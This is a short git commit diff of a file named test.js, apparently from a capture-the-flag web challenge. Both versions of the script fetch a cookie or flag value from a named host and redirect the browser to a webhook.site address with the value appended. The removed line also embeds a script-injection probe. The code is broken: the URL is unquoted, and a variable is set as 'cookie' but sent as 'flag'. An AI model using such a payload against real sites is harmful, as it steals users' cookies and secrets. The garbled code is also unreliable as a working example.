8d80f85eb52ef3ca0e6ad42ffab4d226ce64da63
seohee0605 <165352981+seohee0605@users.noreply.github.com>
2024-09-26 00:13:29 +0900

    Update test.js

--- test.js
+++ test.js
@@ -1,3 +1,3 @@
-fetch(http://sflee.kro.kr:5555/<script>alert(1)</script>).then((response) => response.json()).then(data => {var cookie = data.cookies[0].flag;
-location.href="https://webhook.site/dde0021c-614f-4dc0-b6fc-25294beae606" + flag
+fetch(http://sflee.kro.kr:5555//api/v1/my_cookie/info).then((response) => response.json()).then(data => {var cookie = data.cookies[0].flag;
+location.href="https://webhook.site/6f921727-420f-41a3-94c9-dab4e92db613/" + flag
 }
